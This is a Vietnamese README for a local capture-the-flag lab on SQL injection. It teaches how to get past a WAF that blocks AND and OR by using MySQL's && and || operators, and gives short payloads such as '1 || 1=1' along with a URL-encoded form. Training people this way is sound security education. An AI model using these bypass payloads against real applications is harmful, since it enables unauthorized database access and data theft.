# SQLi-051: MySQL AND/OR Filter Bypass

## 🎯 Mục Tiêu

Bypass filter chặn `AND` và `OR` bằng operators `&&` và `||`.

## 📝 Mô Tả

**Scenario:** WAF chặn boolean keywords `AND` và `OR` để ngăn condition manipulation.

**URL:** `http://localhost:5051/product?id=1`

## 🎓 Kiến Thức Cần Biết

### Boolean Operator Alternatives

```sql
-- Standard
SELECT * FROM users WHERE id=1 AND admin=1
SELECT * FROM users WHERE id=1 OR 1=1

-- MySQL alternatives
SELECT * FROM users WHERE id=1 && admin=1
SELECT * FROM users WHERE id=1 || 1=1
```

### Ví dụ Bypass

```sql
-- Bình thường (bị block)
1 AND 1=1
1 OR 1=1

-- Bypass
1 && 1=1
1 || 1=1

-- URL encoded
1 %26%26 1=1
1 || 1=1
```

## 🚀 Khởi Chạy Lab

```bash
cd Module-07-Filter-Bypass/SQLi-051
docker-compose up -d
```

## 💡 Gợi Ý

1. MySQL hỗ trợ C-style operators
2. `&&` thay cho `AND`
3. `||` thay cho `OR`

## 🏁 Flag Format

```
FLAG{...}
```
